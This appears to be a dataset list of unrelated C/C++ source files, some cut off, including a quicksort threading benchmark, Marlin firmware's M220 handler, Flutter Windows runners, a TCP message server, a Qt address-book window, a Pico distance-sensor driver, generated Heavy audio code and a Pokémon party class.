    "#include \"thread_pool.hpp\"\n\n#include <chrono>\n#include <format>\n#include <iostream>\n#include <list>\n#include <random>\n\nusing namespace std;\n\n// \u4e3a\u4ec0\u4e48\u5f00\u8fd9\u4e48\u591a\u7ebf\u7a0b\n// \u6700\u5f00\u59cb\u6d4b\u8bd5\u65f6\u4ee5\u4e3a\u662f\u7ebf\u7a0b\u6c60\u5b9e\u73b0\u6709\u95ee\u9898\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u4ee5\u53ca\u601d\u8003\u4e4b\u540e\u610f\u8bc6\u5230\u95ee\u9898\u4e0d\u5728\u7ebf\u7a0b\u6c60\u8fd9\n// \u6392\u5e8f\u4ee3\u7801\u5bf9\u7ebf\u7a0b\u6c60\u4e0d\u53cb\u597d\uff0c\u5728\u9012\u5f52\u4e2d\u4f1a\u963b\u585e\u5f53\u524d\u7ebf\u7a0b\uff0c\u6240\u4ee5\u5f53\u7ebf\u7a0b\u6c60\u4e2d\u7684\u7ebf\u7a0b\u4e0d\u591f\u9012\u5f52\u65f6\uff0c\u6574\u4e2a\u7ebf\u7a0b\u6c60\u6240\u6709\u7ebf\u7a0b\u88ab\u963b\u585e\uff0c\u7ebf\u7a0b\u6c60\u4f1a\u505c\u6b62\u5de5\u4f5c\n// \u6700\u540e\u6d4b\u8bd5\u4e0b\u6765\uff0c\u4f7f\u7528\u4e86\u7ebf\u7a0b\u6c60\u7684\u6392\u5e8f\u5728\u591a\u7ebf\u7a0b\u60c5\u51b5\u4e0b\u6027\u80fd\u66f4\u4f18\u4f46\u662f\u4e0d\u5982\u5355\u7ebf\u7a0b\u6392\u5e8f\uff0c\u5e94\u8be5\u662f\u591a\u7ebf\u7a0b\u4e0d\u9002\u5408\u505a\u6392\u5e8f\u5de5\u4f5c\nkoarz::ThreadPool thread_pool(800);\n\ntemplate <typename T> std::list<T> pool_thread_quick_sort(std::list<T> input) {\n  if (input.empty()) {\n    return input;\n  }\n  std::list<T> result;\n  result.splice(result.begin(), input, input.begin());\n  T const &partition_val = *result.begin();\n  typename std::list<T>::iterator divide_point =\n      std::partition(input.begin(), input.end(),\n                     [&](T const &val) { return val < partition_val; });\n  std::list<T> new_lower_chunk;\n  new_lower_chunk.splice(new_lower_chunk.end(), input, input.begin(),\n                         divide_point);\n  std::future<std::list<T>> new_lower =\n      thread_pool.commit(pool_thread_quick_sort<T>, new_lower_chunk);\n  std::list<T> new_higher(pool_thread_quick_sort(input));\n  result.splice(result.end(), new_higher);\n  result.splice(result.begin(), new_lower.get());\n  return result;\n}\n\ntemplate <typename T>\nstd::list<T> single_thread_quick_sort(std::list<T> input) {\n  if (input.empty()) {\n    return input;\n  }\n  std::list<T> result;\n  result.splice(result.begin(), input, input.begin());\n  T const &partition_val = *result.begin();\n  typename std::list<T>::iterator divide_point =\n      std::partition(input.begin(), input.end(),\n                     [&](T const &val) { return val < partition_val; });\n  std::list<T> new_lower_chunk;\n  new_lower_chunk.splice(new_lower_chunk.end(), input, input.begin(),\n                         divide_point);\n  std::list<T> new_lower = single_thread_quick_sort(new_lower_chunk);\n  std::list<T> new_higher(single_thread_quick_sort(input));\n  result.splice(result.end(), new_higher);\n  result.splice(result.begin(), new_lower);\n  return result;\n}\n\ntemplate <typename T> std::list<T> parallel_quick_sort(std::list<T> input) {\n  if (input.empty()) {\n    return input;\n  }\n  std::list<T> result;\n  result.splice(result.begin(), input, input.begin());\n  T const &pivot = *result.begin();\n  auto divide_point = std::partition(input.begin(), input.end(),\n                                     [&](T const &t) { return t < pivot; });\n  std::list<T> lower_part;\n  lower_part.splice(lower_part.end(), input, input.begin(), divide_point);\n  // \u2460\u56e0\u4e3alower_part\u662f\u526f\u672c\uff0c\u6240\u4ee5\u5e76\u884c\u64cd\u4f5c\u4e0d\u4f1a\u5f15\u53d1\u903b\u8f91\u9519\u8bef\uff0c\u8fd9\u91cc\u53ef\u4ee5\u542f\u52a8future\u505a\u6392\u5e8f\n  std::future<std::list<T>> new_lower(\n      std::async(&parallel_quick_sort<T>, std::move(lower_part)));\n\n  // \u2461\n  auto new_higher(parallel_quick_sort(std::move(input)));\n  result.splice(result.end(), new_higher);\n  result.splice(result.begin(), new_lower.get());\n  return result;\n}\n\nstd::list<int> GetRadomList(unsigned int n) {\n  std::list<int> ret;\n  std::random_device rd;\n  std::mt19937 gen(rd());\n  std::uniform_int_distribution<> distrib(0x80000000, 0x7fffffff);\n  for (unsigned int i = 0; i < n; i++) {\n    ret.emplace_back(distrib(gen));\n  }\n  return ret;\n}\n\nint main(int argc, char **argv) {\n  std::list<int> nlist = GetRadomList(1000);\n  std::cout << \"Start Sort\\n\";\n  {\n    auto start_time = std::chrono::steady_clock::now();\n    auto sortlist = pool_thread_quick_sort<int>(nlist);\n    auto end_time = std::chrono::steady_clock::now();\n    std::cout << std::format(\n        \"\\nUsing ThreadPool Sort Spend {} Sorted {} nums\\n\",\n        std::chrono::duration_cast<std::chrono::microseconds>(end_time -\n                                                              start_time),\n        nlist.size());\n  }\n  {\n    auto start_time = std::chrono::steady_clock::now();\n    auto sortlist = single_thread_quick_sort<int>(nlist);\n    auto end_time = std::chrono::steady_clock::now();\n    std::cout << std::format(\n        \"\\nSingleThread SortFunction Spend {} Sorted {} nums\\n\",\n        std::chrono::duration_cast<std::chrono::microseconds>(end_time -\n                                                              start_time),\n        nlist.size());\n  }\n  {\n\n    auto start_time = std::chrono::steady_clock::now();\n    auto sortlist = parallel_quick_sort<int>(nlist);\n    auto end_time = std::chrono::steady_clock::now();\n    std::cout << std::format(\n        \"\\nMultiThread SortFunction Spend {} Sorted {} nums\\n\",\n        std::chrono::duration_cast<std::chrono::microseconds>(end_time -\n                                                              start_time),\n        nlist.size());\n  }\n  {\n    auto start_time = std::chrono::steady_clock::now();\n    nlist.sort();\n    auto end_time = std::chrono::steady_clock::now();\n    std::cout << std::format(\n        \"\\nSTL SortFunction Spend {} Sorted {} nums\\n\",\n        std::chrono::duration_cast<std::chrono::microseconds>(end_time -\n                                                              start_time),\n        nlist.size());\n  }\n  return 0;\n}\n",
    "/**\n * Marlin 3D Printer Firmware\n * Copyright (c) 2020 MarlinFirmware [https://github.com/MarlinFirmware/Marlin]\n *\n * Based on Sprinter and grbl.\n * Copyright (c) 2011 Camiel Gubbels / Erik van der Zalm\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n */\n\n#include \"../gcode.h\"\n#include \"../../module/motion.h\"\n\n/**\n * M220: Set speed percentage factor, aka \"Feed Rate\"\n *\n * Parameters\n *   S<percent> : Set the feed rate percentage factor\n *\n * Report the current speed percentage factor if no parameter is specified\n *\n * For MMU2 and MMU2S devices...\n *   B : Flag to back up the current factor\n *   R : Flag to restore the last-saved factor\n */\nvoid GcodeSuite::M220() {\n  if (!parser.seen_any()) {\n    SERIAL_ECHOLNPGM(\"FR:\", feedrate_percentage, \"%\");\n    return;\n  }\n\n  static int16_t backup_feedrate_percentage = 100;\n  const int16_t now_feedrate_perc = feedrate_percentage;\n  if (parser.seen_test('R')) feedrate_percentage = backup_feedrate_percentage;\n  if (parser.seen_test('B')) backup_feedrate_percentage = now_feedrate_perc;\n  if (parser.seenval('S')) feedrate_percentage = parser.value_int();\n\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"first_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"theme_bloc\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"global.h\"\n#include \"saveData.h\"\n#include \"filter.h\"\n#include \"log.h\"\nlogNameSpace::Log prlog;\nint showForSend(string, filter, bool, ClientSocketFlagStruct::states);\nmap<string, int> StringToInt =\n    {\n        {\"connect\", 1},\n        {\"del\", 2},\n        {\"show\", 3},\n        {\"cmd\", 4}\n\n};\nbool send_message(SOCKET sock, const std::string &message)\n{\n    std::ostringstream oss;\n    oss << message.size() << \"\\r\\n\\r\\n\\r\\n\\r\\n\\r\\n\"\n        << message; // \u6784\u5efa\u6d88\u606f\uff0c\u5305\u542b\u957f\u5ea6\u548c\u5b9e\u9645\u6570\u636e\n    std::string formatted_message = oss.str();\n\n    int total_sent = 0;\n    int message_length = formatted_message.size();\n    const char *data = formatted_message.c_str();\n\n    while (total_sent < message_length)\n    {\n        int bytes_sent = send(sock, data + total_sent, message_length - total_sent, 0);\n        if (bytes_sent == SOCKET_ERROR)\n        {\n            return false; // \u53d1\u9001\u5931\u8d25\n        }\n        total_sent += bytes_sent;\n    }\n    return true; // \u53d1\u9001\u6210\u529f\n}\nbool receive_message(SOCKET sock, std::string &message)\n{\n    std::string length_str;\n    char buffer[16384] = {0};\n    int received;\n\n    // \u9996\u5148\u8bfb\u53d6\u957f\u5ea6\u90e8\u5206\uff0c\u76f4\u5230\u63a5\u6536\u5230 \\r\\n\n    while (true)\n    {\n        received = recv(sock, buffer, 1, 0); // \u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\n        if (received <= 0)\n        {\n            return false; // \u8fde\u63a5\u65ad\u5f00\u6216\u8bfb\u53d6\u51fa\u9519\n        }\n        if (buffer[0] == '\\r')\n        {\n            // \u7ee7\u7eed\u8bfb\u53d6\\n\n            received = recv(sock, buffer, 1, 0);\n            if (received <= 0 || buffer[0] != '\\n')\n            {\n                return false; // \u683c\u5f0f\u9519\u8bef\n            }\n\n            for (int i = 1; i <= 4; i++)\n            {\n                received = recv(sock, buffer, 1, 0);\n                if (received <= 0 || buffer[0] != '\\r')\n                {\n                    return false; // \u683c\u5f0f\u9519\u8bef\n                }\n                received = recv(sock, buffer, 1, 0);\n                if (received <= 0 || buffer[0] != '\\n')\n                {\n                    return false; // \u683c\u5f0f\u9519\u8bef\n                }\n            }\n            break; // \u8bfb\u53d6\u5230 \\r\\n\uff0c\u9000\u51fa\u5faa\u73af\n        }\n        length_str += buffer[0];\n    }\n\n    int data_length = std::stoi(length_str); // \u8f6c\u6362\u957f\u5ea6\u5b57\u7b26\u4e32\u4e3a\u6574\u6570\n    message.resize(data_length);\n\n    int total_received = 0;\n    while (total_received < data_length)\n    {\n        received = recv(sock, &message[total_received], data_length - total_received, 0);\n        if (received <= 0)\n        {\n            return false; // \u8fde\u63a5\u65ad\u5f00\u6216\u8bfb\u53d6\u51fa\u9519\n        }\n        total_received += received;\n    }\n\n    return true; // \u63a5\u6536\u6210\u529f\n}\nint initServer(SOCKET &ListenSocket, sockaddr_in &sockAddr, int port)\n{\n    auto funlog = prlog.getFunLog(\"initServer\");\n#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)\n    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);\n    if (iResult != 0)\n    {\n        *funlog << \"WSAStartup() failed with error: \" << iResult << \"\\n\";\n        *funlog << \"initServer End\\n\";\n        return iResult;\n    }\n#endif\n    // \u521b\u5efa\u5957\u63a5\u5b57\n    ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    if (ListenSocket == INVALID_SOCKET)\n    {\n        int errorCode = WSAGetLastError();\n        *funlog << \"socket() failed with error: \" << errorCode << \"\\n\";\n        *funlog << \"initServer End\\n\";\n#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)\n        WSACleanup();\n#endif\n        return errorCode;\n    }\n    // \u7ed1\u5b9a\u5957\u63a5\u5b57\n\n    sockAddr.sin_family = AF_INET;\n    sockAddr.sin_addr.s_addr = INADDR_ANY;\n    sockAddr.sin_port = htons(port);\n    if (bind(ListenSocket, (SOCKADDR *)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR)\n    {\n        closesocket(ListenSocket);\n#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)\n        WSACleanup();\n#endif\n        int errorCode = WSAGetLastError();\n        *funlog << \"bind() failed with error: \" << errorCode << \"\\n\";\n        *funlog << \"initServer End\\n\";\n        return errorCode;\n    }\n    // \u76d1\u542c\u5957\u63a5\u5b57\n    if (listen(ListenSocket, 5) == SOCKET_ERROR)\n    {\n        closesocket(ListenSocket);\n#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)\n        WSACleanup();\n#endif\n        int errorCode = WSAGetLastError();\n        *funlog << \"listen() failed with error: \" << errorCode << \"\\n\";\n        *funlog << \"initServer End\\n\";\n        return errorCode;\n    }\n    *funlog << \"initServer End\\n\";\n    return 0;\n}\nstring StringTime(time_t t1)\n{\n    auto funlog = prlog.getFunLog(\"StringTime\");\n    time_t t = t1;\n    char tmp[64];\n    struct tm *timinfo;\n    timinfo = localtime(&t);\n    strftime(tmp, sizeof(tmp), \"%Y%m%d%H%M\", timinfo);\n    *funlog << \"String Time End\\n\";\n    return tmp;\n}\nvoid setServerOrClientExit(SEIDForSocketStruct &s)\n{\n    auto funlog = prlog.getFunLog(\"setServerOrClientExit SEID:\" + s.SEID);\n    // \u8bbe\u7f6e\u9000\u51fa\u6807\u5fd7\n    {\n        std::lock_guard<std::mutex> lock(s.OtherValueLock);\n        s.isBack = true;\n        s.isSocketExit = false;\n        *funlog << \"set status isBack\\n\";\n    }\n    // \u5173\u95ed\u6d4b\u8bd5\u5957\u63a5\u5b57\n    {\n        std::lock_guard<std::mutex> lock(s.ServerHealthySocketLock);\n        closesocket(s.so",
    "// Copyright (C) 2016 The Qt Company Ltd.\n// SPDX-License-Identifier: LicenseRef-Qt-Commercial OR BSD-3-Clause\n\n#include \"mainwindow.h\"\n\n#include <QAction>\n#include <QFileDialog>\n#include <QMenuBar>\n\n//! [0]\nMainWindow::MainWindow()\n    : QMainWindow(),\n      addressWidget(new AddressWidget)\n{\n    setCentralWidget(addressWidget);\n    createMenus();\n    setWindowTitle(tr(\"Address Book\"));\n}\n//! [0]\n\n//! [1a]\nvoid MainWindow::createMenus()\n{\n    QMenu *fileMenu = menuBar()->addMenu(tr(\"&File\"));\n\n    QAction *openAct = new QAction(tr(\"&Open...\"), this);\n    fileMenu->addAction(openAct);\n    connect(openAct, &QAction::triggered, this, &MainWindow::openFile);\n//! [1a]\n\n    QAction *saveAct = new QAction(tr(\"&Save\"), this);\n    fileMenu->addAction(saveAct);\n    connect(saveAct, &QAction::triggered, this, &MainWindow::saveFile);\n\n    fileMenu->addSeparator();\n\n    QAction *exitAct = new QAction(tr(\"E&xit\"), this);\n    fileMenu->addAction(exitAct);\n    connect(exitAct, &QAction::triggered, this, &QWidget::close);\n\n    QMenu *toolMenu = menuBar()->addMenu(tr(\"&Tools\"));\n\n    QAction *addAct = new QAction(tr(\"&Add Entry...\"), this);\n    toolMenu->addAction(addAct);\n    connect(addAct, &QAction::triggered,\n            addressWidget, &AddressWidget::showAddEntryDialog);\n\n//! [1b]\n    editAct = new QAction(tr(\"&Edit Entry...\"), this);\n    editAct->setEnabled(false);\n    toolMenu->addAction(editAct);\n    connect(editAct, &QAction::triggered, addressWidget, &AddressWidget::editEntry);\n\n    toolMenu->addSeparator();\n\n    removeAct = new QAction(tr(\"&Remove Entry\"), this);\n    removeAct->setEnabled(false);\n    toolMenu->addAction(removeAct);\n    connect(removeAct, &QAction::triggered, addressWidget, &AddressWidget::removeEntry);\n\n    connect(addressWidget, &AddressWidget::selectionChanged,\n        this, &MainWindow::updateActions);\n}\n//! [1b]\n\n//! [2]\nvoid MainWindow::openFile()\n{\n    addressWidget->readFromFile();\n}\n//! [2]\n\n//! [3]\nvoid MainWindow::saveFile()\n{\n    addressWidget->writeToFile();\n}\n//! [3]\n\n//! [4]\nvoid MainWindow::updateActions(const QItemSelection &selection)\n{\n    QModelIndexList indexes = selection.indexes();\n\n    if (!indexes.isEmpty()) {\n        removeAct->setEnabled(true);\n        editAct->setEnabled(true);\n    } else {\n        removeAct->setEnabled(false);\n        editAct->setEnabled(false);\n    }\n}\n//! [4]\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"time_tag\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../include/Distance_Sensor.hpp\"\r\n#include \"hardware/gpio.h\"\r\n\r\n\r\n  dis_sensor::dis_sensor()\r\n {\r\n    //GPIO Initialization=====================\r\n    gpio_init(Distance_Sensor_outputs[0]);\r\n    gpio_init(Distance_Sensor_outputs[1]);\r\n    //=========================================\r\n\r\n    //Sets gpio directions==========================================\r\n    gpio_set_dir(Distance_Sensor_outputs[0], GPIO_IN);\r\n    gpio_set_dir(Distance_Sensor_outputs[1], GPIO_OUT);\r\n    //=============================================================\r\n\r\n    gpio_pull_down(Distance_Sensor_outputs[0]); //sets Echo to idle low\r\n\r\n    //Sets a system interrupt to occur on both rising and falling edge of the Echo pin to measure distance\r\n    gpio_set_irq_enabled_with_callback(Distance_Sensor_outputs[0], GPIO_IRQ_EDGE_FALL| GPIO_IRQ_EDGE_RISE, true, &callback); \r\n\r\n }\r\n\r\n\r\nvoid dis_sensor::callback(uint gpio,uint32_t event)\r\n{\r\n   \r\n   \r\n   if(event == GPIO_IRQ_EDGE_RISE)\r\n   {\r\n      \r\n      temp_system_time = to_us_since_boot(get_absolute_time());\r\n   }\r\n\r\n   else  {\r\n      distance = (to_us_since_boot(get_absolute_time())-temp_system_time)/52;\r\n   }\r\n\r\n\r\n}\r\n\r\nvoid dis_sensor::tigger_sensor()\r\n{\r\n   gpio_put(Distance_Sensor_outputs[1],1);\r\n   sleep_us(10);\r\n   gpio_put(Distance_Sensor_outputs[1],0);\r\n}",
    "/**\r\n * Copyright (c) 2024 Enzien Audio, Ltd.\r\n * \r\n * Redistribution and use in source and binary forms, with or without modification,\r\n * are permitted provided that the following conditions are met:\r\n * \r\n * 1. Redistributions of source code must retain the above copyright notice,\r\n *    this list of conditions, and the following disclaimer.\r\n * \r\n * 2. Redistributions in binary form must reproduce the phrase \"powered by heavy\",\r\n *    the heavy logo, and a hyperlink to https://enzienaudio.com, all in a visible\r\n *    form.\r\n * \r\n *   2.1 If the Application is distributed in a store system (for example,\r\n *       the Apple \"App Store\" or \"Google Play\"), the phrase \"powered by heavy\"\r\n *       shall be included in the app description or the copyright text as well as\r\n *       the in the app itself. The heavy logo will shall be visible in the app\r\n *       itself as well.\r\n * \r\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\r\n * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,\r\n * THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE\r\n * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\r\n * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\r\n * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\r\n * SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\r\n * CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\r\n * OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\r\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n * \r\n */\r\n\r\n#include \"Heavy_prog.hpp\"\r\n\r\n#include <new>\r\n\r\n#define Context(_c) static_cast<Heavy_prog *>(_c)\r\n\r\n\r\n/*\r\n * C Functions\r\n */\r\n\r\nextern \"C\" {\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new(double sampleRate) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT HeavyContextInterface *hv_prog_new_with_options(double sampleRate,\r\n      int poolKb, int inQueueKb, int outQueueKb) {\r\n    // allocate aligned memory\r\n    void *ptr = hv_malloc(sizeof(Heavy_prog));\r\n    // ensure non-null\r\n    if (!ptr) return nullptr;\r\n    // call constructor\r\n    new(ptr) Heavy_prog(sampleRate, poolKb, inQueueKb, outQueueKb);\r\n    return Context(ptr);\r\n  }\r\n\r\n  HV_EXPORT void hv_prog_free(HeavyContextInterface *instance) {\r\n    // call destructor\r\n    Context(instance)->~Heavy_prog();\r\n    // free memory\r\n    hv_free(instance);\r\n  }\r\n} // extern \"C\"\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n/*\r\n * Class Functions\r\n */\r\n\r\nHeavy_prog::Heavy_prog(double sampleRate, int poolKb, int inQueueKb, int outQueueKb)\r\n    : HeavyContext(sampleRate, poolKb, inQueueKb, outQueueKb) {\r\n  numBytes += sPhasor_k_init(&sPhasor_kG0jqmqW, 0.0f, sampleRate);\r\n  numBytes += sDel1_init(&sDel1_hSyuXkW6);\r\n  numBytes += sSamphold_init(&sSamphold_iMqXbhDY);\r\n  numBytes += sRPole_init(&sRPole_l95GvnCm);\r\n  numBytes += sDel1_init(&sDel1_B82cpUDL);\r\n  numBytes += sLine_init(&sLine_4fpzOE9t);\r\n  numBytes += sPhasor_init(&sPhasor_Dvyw69vN, sampleRate);\r\n  numBytes += sLine_init(&sLine_RBQizvZ5);\r\n  numBytes += sTabhead_init(&sTabhead_Iyc2DSsv, &hTable_1aYRT8cO);\r\n  numBytes += sTabread_init(&sTabread_Nkg5TmFf, &hTable_1aYRT8cO, false);\r\n  numBytes += sTabread_init(&sTabread_jyu4FqkL, &hTable_1aYRT8cO, false);\r\n  numBytes += sLine_init(&sLine_6oZu4BrQ);\r\n  numBytes += sLine_init(&sLine_ZIeSyHu5);\r\n  numBytes += sTabhead_init(&sTabhead_aP4CmbsV, &hTable_NSkeEpty);\r\n  numBytes += sTabread_init(&sTabread_sUepTZ4s, &hTable_NSkeEpty, false);\r\n  numBytes += sTabread_init(&sTabread_aLrVZTxD, &hTable_NSkeEpty, false);\r\n  numBytes += sLine_init(&sLine_KAckL2vt);\r\n  numBytes += sTabwrite_init(&sTabwrite_7mJnEhGn, &hTable_1aYRT8cO);\r\n  numBytes += sTabwrite_init(&sTabwrite_L2RPHpTJ, &hTable_NSkeEpty);\r\n  numBytes += sPhasor_k_init(&sPhasor_JjjOFbU2, 700.0f, sampleRate);\r\n  numBytes += sLine_init(&sLine_W5J15VYc);\r\n  numBytes += sRPole_init(&sRPole_RTSjMk0x);\r\n  numBytes += sLine_init(&sLine_E1zc1LNI);\r\n  numBytes += sPhasor_init(&sPhasor_liJxjIhL, sampleRate);\r\n  numBytes += cRandom_init(&cRandom_3MWDTDjD, -984571588);\r\n  numBytes += cSlice_init(&cSlice_E9e5QwVB, 1, 1);\r\n  numBytes += sVari_init(&sVari_OBeaNEks, 0, 0, false);\r\n  numBytes += cVar_init_f(&cVar_yYUkpBV7, 1.0f);\r\n  numBytes += cVar_init_f(&cVar_AEcZ4vUh, 0.0f);\r\n  numBytes += cVar_init_f(&cVar_6apeTkQl, 0.0f);\r\n  numBytes += cVar_init_f(&cVar_GbXiXSRH, 0.0f);\r\n  numBytes += cBinop_init(&cBinop_MqnaKaHc, 29.0f); // __div\r\n  numBytes += sVarf_init(&sVarf_eYV9GUiW, 0.0f, 0.0f, false);\r\n  numBytes += cVar_init_f(&cVar_3NO5qWok, 22050.0f);\r\n  numBytes += cBinop_init(&cBinop_X574sfrk, 0.0f); // __mul\r\n  numBytes += sVarf_init(&sVarf_5l9cAdVg, 0.0f, 0.0f, false);\r\n  numBytes += sVarf_init(&",
    "//\r\n// Created by louis on 12/09/2024.\r\n//\r\n\r\n#include \"PokemonParty.h\"\r\n#include <iostream>\r\n#include <algorithm>\r\n\r\nPokemonParty::PokemonParty(){\r\n\r\n}\r\n\r\n/*PokemonParty::PokemonParty(std::vector<Pokemon*>& capturedPokemon) {\r\n    battlePokemon.clear();  // Vider l'\u00e9quipe actuelle\r\n    int chosenIndex;\r\n    int count = 0;\r\n\r\n    if (capturedPokemon.empty()) {\r\n        std::cout << \"Vous n'avez capture aucun Pok\u00e9mon.\" << std::endl;\r\n        return;\r\n    }\r\n\r\n    // Afficher les Pok\u00e9mon captur\u00e9s avec leurs index\r\n    std::cout << \"Selectionnez 6 Pokemon pour votre equipe de combat : \" << std::endl;\r\n    for (size_t i = 0; i < capturedPokemon.size(); ++i) {\r\n        std::cout << i + 1 << \": \";\r\n        capturedPokemon[i]->displayInfo();\r\n    }\r\n\r\n    // Demander au joueur de s\u00e9lectionner les Pok\u00e9mon par leur index\r\n    while (count < 6 && count < capturedPokemon.size()) {\r\n        std::cout << \"Choisissez un Pokemon par son numero (entre 1 et \" << capturedPokemon.size() << \") : \";\r\n        std::cin >> chosenIndex;\r\n\r\n        // V\u00e9rification que l'index est valide\r\n        if (chosenIndex < 1 || chosenIndex > static_cast<int>(capturedPokemon.size())) {\r\n            std::cout << \"Numero invalide, veuillez reessayer.\" << std::endl;\r\n            continue;\r\n        }\r\n\r\n        // V\u00e9rifier si le Pok\u00e9mon a d\u00e9j\u00e0 \u00e9t\u00e9 s\u00e9lectionn\u00e9\r\n        Pokemon* selectedPokemon = capturedPokemon[chosenIndex - 1];\r\n        if (std::find(battlePokemon.begin(), battlePokemon.end(), selectedPokemon) != battlePokemon.end()) {\r\n            std::cout << \"Vous avez deja selectionne ce Pokemon. Choisissez-en un autre.\" << std::endl;\r\n            continue;\r\n        }\r\n\r\n        // Ajouter le Pok\u00e9mon s\u00e9lectionn\u00e9 \u00e0 l'\u00e9quipe de combat\r\n        battlePokemon.push_back(selectedPokemon);\r\n        std::cout << selectedPokemon->getName() << \" a ete ajoute a votre equipe de combat !\" << std::endl;\r\n        count++;\r\n    }\r\n\r\n    if (battlePokemon.size() 